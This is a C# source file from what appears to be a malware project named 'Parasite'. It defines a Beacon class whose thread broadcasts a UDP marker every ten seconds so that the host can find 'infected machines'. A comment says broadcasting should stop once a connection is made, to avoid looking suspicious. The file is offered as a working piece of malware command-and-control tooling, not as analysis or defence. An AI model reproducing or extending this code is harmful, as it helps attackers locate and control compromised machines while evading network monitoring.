using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Parasite.Host
{
    /// <summary>
    /// Beacon is a class that will run a thread doing a UDP broadcast every x seconds for discovery of infected machines.
    /// Once a connection is secured the client is expected to remember what IP is infected so we don't keep
    /// spamming the network with UDP broadcasts which gets suspicious fast.
    /// Of course, a client might change its ip or have a dynamic IP. In that case, fuck.
    /// </summary>
    public class Beacon
    {
        private Thread _beaconThread;
        private bool _running = false;
        private const string BROADCAST_TEXT = "prst!!";
        private int _port;

        public Beacon(int port)
        {
            _beaconThread = new Thread(new ThreadStart(loopBroadcast));
            this._port = port;
        }

        public void Start()
        {
            _running = true;
            _beaconThread.Start();
        }

        public void Stop()
        {
            _running = false;
        }

        private void loopBroadcast()
        {
            // setting up socket and stuffs
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.Broadcast, true);
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Broadcast, this._port);

            while(_running)
            {
                // broadcast
                socket.SendTo(Encoding.UTF8.GetBytes(BROADCAST_TEXT), endpoint);
                Console.WriteLine("Sending broadcast");
                Thread.Sleep(10000);
            }
            // Method ends, thread is goners
            socket.Close();
        }
    }
}
